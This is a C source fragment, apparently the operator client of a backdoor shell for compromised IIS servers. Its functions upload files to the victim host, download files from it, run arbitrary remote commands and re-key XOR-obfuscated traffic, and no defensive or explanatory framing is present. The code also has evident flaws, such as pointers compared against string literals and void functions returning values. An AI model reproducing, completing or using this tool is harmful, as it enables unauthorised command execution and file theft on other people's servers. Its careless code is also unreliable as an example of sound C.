

void shellcmd()
{

  int   i,j,k,l;
  char  recvbuff[BUFFSIZE];
  char  buff[BUFFSIZE];

  lockintvar1=LOCKBIGNUM2%LOCKBIGNUM;
  lockintvar2=lockintvar1;
  xordatabegin=0;

  Sleep(5000);


 
  k=1;
  l=0;
  while(1)
  {
	  if(k<=0)
	  {

		  l=0;
          i=0;
	//	  while(i==0){
			  buff[0]=0;
              cmdstat                = IISDATA;

              __try{
              j=strin(buff,sizeof(buff));
              }  __except(1)
			  {
			   // printf("\r\nstrin error!!\r\n");
			  }
			  if(memcmp(buff,"iisexit",7)==0)
			  {
				     strout("\r\nClose server!\r\n");
					 Sleep(1000);
		  	         exit(0);
			  }
			  if(memcmp(buff,"iisput",6)==0){
				   cmdstat                = IISPUT;
		  	         iisput(buff+6);
					 i=2;
			  }
              if(memcmp(buff,"iisget",6)==0){
				   cmdstat                = IISGET;
		  	         iisget(buff+6);
					 i=2;
			  }
              if(memcmp(buff,"iiscmd",6)==0){
				  cmdstat                = IISCMD;

    	             iiscmd(buff+6);
					 i=2;
              }
/*            if(memcmp(buff,"iish",4)==0){
		  	         iishelp();
					 i=2;
			  }
              if(memcmp(buff,"iisreset",8)==0){
    	             iisreset(fd,buff+6);
					 i=2;
              }
              if(memcmp(buff,"iisdie",6)==0){
    	             iisdie(fd,buff+6);
					 i=2;
              }

*/
		//	  if(i==2)i=0;
		//	  else i=1;

  //        }
	

		  k=strlen(buff);
		  if(i!=2&&j>=0)
		  {	  
             memcpy(buff+k,SRLF,3);
	         newsendrecv(buff,k+2,recvbuff,BUFFSIZE);
		  }

      }

	  cmdstat                = IISDATA;
	  k=newrecv(buff,BUFFSIZE);
	  if(k>0)
	  {
          l=0;
		  buff[k]=0;
		  strout(buff);

      }
      else
	  {
		  Sleep(20);
		  if(l<4) k=1;
          ++l;  
      }


  }
}


void iisput(char *str){
 
 char *filename;
 char *filename2;
 FILE *fpt;
 char buff[BUFFSIZE];
 int size=0x2000,i,j,filesize,filesizehigh,remotefpt;

 filename="\0";
 filename2="\0";
 j=strlen(str);
 for(i=0;i<j;++i,++str){
	 if(*str!=' '){
		 filename=str;
         break;
     } 
 }
 for(;i<j;++i,++str){
	 if(*str==' ') {
		 *str=0;
		 break;
     }
 }
 ++i;
 ++str;
 for(;i<j;++i,++str){
	 if(*str!=' '){
	   filename2=str;
       break;
     }
 }
 for(;i<j;++i,++str){
	 if(*str==' ') {
		 *str=0;
		 break;
     }
 }


 if(filename=="\x0") {
     strout("\r\n iisput <local filename> [remote path\\fiename]\r\n");	 
	 return;
 }
 if(filename2=="\x0") filename2=filename;
 
 outprintf("\r\n begin put file:%s",filename);

 
 Sleep(1000);
 
 fpt=CreateFile(filename,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0); 
 if(fpt<=0)
 { 
    outprintf("\r\n open local file error!\r\n");
	return 0;
 }

 filesize=GetFileSize(fpt,&filesizehigh);
// strcpy(buff,"put ");
 
 
 *(char *)(buff)=FILEOPEN;
 //*(int *)(buff)=filesize;

// filesize=*(int *)(buff);
 strcpy(buff+0x1,filename2);

 i=newsendrecv(buff,strlen(filename2)+0x2,buff,BUFFSIZE);
 remotefpt=*(int *)(buff);
 if(i<4||remotefpt<=0)
 { 
	CloseHandle(fpt);
    outprintf("\r\n create remote file error!\r\n");
	return 0;
 }

 outprintf("\r\n put file:%s to file:%s %d bytes",filename,filename2,filesize);
 Sleep(1000);

 while(filesize>0){
	  size=0x800;
      ReadFile(fpt,buff+5,size,&size,NULL); 
      if(size>0){
          filesize-=size;
		  *(char *)(buff)=FILEDATA;
		  *(int *)(buff+1)=remotefpt;
		  newsendrecv(buff,size+5,buff,BUFFSIZE);
//	      Sleep(0100);
	     
      }
 }

          *(char *)(buff)=FILECLOSE;
		  *(int *)(buff+1)=remotefpt;
		  newsendrecv(buff,5,buff,BUFFSIZE);


 CloseHandle(fpt);
 
 outprintf("\r\n put file ok!\r\n");
 Sleep(1000);
 
 
}



void iisget(char *str){
 
 char *filename;
 char *filename2;
 FILE *fpt;
 char buff[BUFFSIZE];
 int size=0x2000,i,j,filesize,remotefpt;  //,filesizehigh;

 filename="\0";
 filename2="\0";
 j=strlen(str);
 for(i=0;i<j;++i,++str){
	 if(*str!=' '){
		 filename=str;
         break;
     } 
 }
 for(;i<j;++i,++str){
	 if(*str==' ') {
		 *str=0;
		 break;
     }
 }
 ++i;
 ++str;
 for(;i<j;++i,++str){
	 if(*str!=' '){
	   filename2=str;
       break;
     }
 }
 for(;i<j;++i,++str){
	 if(*str==' ') {
		 *str=0;
		 break;
     }
 }


 if(filename=="\x0")
 {
     outprintf("\r\n iisget <local filename> [remote path\\fiename]\r\n");	 
	 return;
 }
 if(filename2=="\x0") filename2=filename;
 
 outprintf("\r\n begin get file:%s",filename);
 
 fpt=CreateFileA(filename,FILE_FLAG_WRITE_THROUGH+GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0); 
 if(fpt<=0)
 { 
    outprintf("\r\n open local file error!\r\n");
	return 0;
 }

 
 *(char *)(buff)=FILEOPEN;
 strcpy(buff+0x1,filename2);
 newsendrecv(buff,strlen(filename2)+0x2,buff,BUFFSIZE);
 remotefpt=*(int *)(buff);
 filesize=*(int *)(buff+4);

 if(remotefpt<=0)
 { 
	CloseHandle(fpt);
    outprintf("\r\n create remote file error!\r\n");
	return 0;
 }

 outprintf("\r\n get file:%s from file:%s",filename,filename2);
 outprintf("\r\n file %d bytes\r\n",filesize);
  
 while(filesize>0)
 {
	      *(char *)(buff)=FILEDATA;
		  *(int *)(buff+1)=remotefpt;
		  size=newsendrecv(buff,5,buff,BUFFSIZE);   
          if(size>0){
             filesize-=size;
             WriteFile(fpt,buff,size,&size,NULL); 
          }
 
 }
 
 
          *(char *)(buff)=FILECLOSE;
		  *(int *)(buff+1)=remotefpt;
		  newsendrecv(buff,5,buff,BUFFSIZE);

 CloseHandle(fpt);
 outprintf("\r\n get file ok!\r\n");


}


void iisreset(char *str){

    char buff[BUFFSIZE];
	int  i,j;
    outprintf("\nreset xor data.\n");
    Sleep(1000);
    
    strcpy(buff,"reset");
    newsendrecv(buff,strlen(buff),buff,BUFFSIZE);
	Sleep(1000);

   

    lockintvar1=LOCKBIGNUM2%LOCKBIGNUM;
    lockintvar2=lockintvar1;


	while(1){
	  j=newrecv(buff,0x2000);
	  if(j>0){
		  buff[j]=0;
		  for(i=0;i<j;++i){
			  if(buff[i]==0) buff[i]='b';
          }
	//	  outprintf("\r\nrecv 0x%x bytes:%s",j,buff);
		  if(strstr(buff,"xordatareset")!=0){
			 outprintf("\r\nxor data reset ok.\r\n");

             for(i=strstr(buff,"xordatareset")-buff+0x0c;i<j;++i){
                lockintvar1=lockintvar1*0x100;
				lockintvar1=lockintvar1%LOCKBIGNUM;
				lockcharvar=lockintvar1%0x100;
                buff[i]^=lockcharvar;   // DATAXORCODE;
			  }
			

			  break;
          }
      }

	}
	Sleep(1000);
   
}



void iisdie(char *str){

    char buff[BUFFSIZE];
	int  j;
    outprintf("\r\niis die.\r\n");
    
    Sleep(1000);
    strcpy(buff,"iisrr ");
    newsendrecv(buff,strlen(buff),buff,BUFFSIZE);
	Sleep(1000);
    
    lockintvar1=LOCKBIGNUM2%LOCKBIGNUM;
    lockintvar2=lockintvar1;
}



void iiscmd(char *str)
{

	char *cmd="\0";
	char buff[BUFFSIZE];
    int  i,j;

    j=strlen(str);
    for(i=0;i<j;++i,++str){
	  if(*str!=' '){
	 	 cmd=str;
         break;
	  } 
	}
	j=strlen(str);
    for(i=0;i<j;++i){
	   if(*(str+j-i-1)!=' ') {
	  	 break;
	   }
	   else *(str+j-i-1)=0;
	}
  
	if(cmd=="\x0") {
        outprintf("\r\niiscmd cmd\r\n");	 
	    return;
	}
 
    outprintf("\r\nbegin run cmd:%s\r\n",cmd);
   
    Sleep(1000);
   // strcpy(buff,"iisc ");
	strcpy(buff,cmd);
    newsendrecv(buff,strlen(buff)+1,buff,BUFFSIZE);
	Sleep(1000);
    

}




